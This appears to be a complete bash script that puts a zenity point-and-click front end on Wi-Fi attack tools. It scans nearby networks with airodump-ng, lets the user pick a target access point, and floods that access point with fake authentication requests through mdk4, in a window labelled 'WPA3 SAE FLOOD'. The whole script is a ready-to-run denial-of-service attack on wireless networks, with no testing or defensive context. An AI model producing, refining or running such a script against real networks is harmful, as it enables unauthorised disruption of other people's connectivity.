#!/bin/bash

# --- 1. Selection ---
INT_MON=$(zenity --list --title="SHABANG" --column="Interface" $(ls /sys/class/net | grep wlan))

# --- 2. The Scanner Logic (The Fix) ---
rm -f /tmp/shabang-01.csv

# Use 'sudo' inside xterm to ensure it has permission to write the file
xterm -geometry 100x24 -e "sudo airodump-ng $INT_MON --band g -w /tmp/shabang --output-format csv" &
SCAN_PID=$!

# LOGIC GATE: Wait for the file to exist before continuing
echo "Waiting for scanner to initialize..."
while [ ! -f /tmp/shabang-01.csv ]; do
    sleep 1
done

# Now give the user a moment to see the targets
zenity --info --text="Scan is running. Look at the xterm window.\n\nClick OK when you are ready to pick a target." --width=300
kill $SCAN_PID

# --- 3. Target Selection ---
# Now awk is guaranteed to find the file
TARGET_RAW=$(awk -F, 'NR>2 {print $1 "|" $14}' /tmp/shabang-01.csv | zenity --list --title="Select Target" --column="BSSID" --column="SSID" --delimiter="|")
BSSID=$(echo $TARGET_RAW | cut -d'|' -f1 | tr -d ' ')

# --- 4. Launch Attack ---
if [ ! -z "$BSSID" ]; then
    xterm -T "WPA3 SAE FLOOD" -e "sudo mdk4 $INT_MON a -a $BSSID -m -s 1000" &
fi
